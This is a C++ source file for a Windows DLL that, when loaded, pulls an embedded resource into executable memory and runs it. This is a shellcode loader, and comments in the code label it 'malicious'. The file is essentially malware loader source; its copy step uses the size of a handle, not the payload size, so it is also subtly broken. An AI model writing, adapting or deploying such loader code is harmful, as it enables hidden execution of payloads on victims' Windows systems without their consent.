// dllmain.cpp : Defines the entry point for the DLL application.
#include <windows.h>
#include "stdafx.h"
#include "resource.h"
#include <strsafe.h>
#include <iostream>
using namespace std;

extern "C" __declspec(dllexport) void Entry(HMODULE handle) {
	//MessageBox(NULL, L"New", L"malicious part deux", MB_OK);

	
	HRSRC hResource = NULL;
	HGLOBAL hMemory = NULL;

	hResource = FindResource(handle, MAKEINTRESOURCE(IDR_LIGHT1), L"light" );
	hMemory = LoadResource(handle, hResource);

	if (hMemory != NULL){
		//MessageBox(NULL, L"apples", L"More apples", MB_OK);

		void * exec = VirtualAlloc(0, sizeof hMemory, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		memcpy(exec, hMemory, sizeof hMemory);

		((void(*)())exec)();
	}
	else {
		LPVOID lpMsgBuf;
		LPVOID lpDisplayBuf;
		DWORD dw = GetLastError();

		FormatMessage(
			FORMAT_MESSAGE_ALLOCATE_BUFFER |
			FORMAT_MESSAGE_FROM_SYSTEM |
			FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL,
			dw,
			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
			(LPTSTR)&lpMsgBuf,
			0, NULL);

		// Display the error message and exit the process

		lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
			(lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)"FindResource") + 40) * sizeof(TCHAR));
		StringCchPrintf((LPTSTR)lpDisplayBuf,
			LocalSize(lpDisplayBuf) / sizeof(TCHAR),
			TEXT("%s failed with error %d: %s"),
			L"FindResource", dw, lpMsgBuf);
		MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

		LocalFree(lpMsgBuf);
		LocalFree(lpDisplayBuf);
	}
	
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH: {

		//MessageBox(NULL,L"begins",L"malicious",MB_OK);
		Entry(hModule);

		break;
	}
	case DLL_THREAD_ATTACH: {
		break;
	}
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}

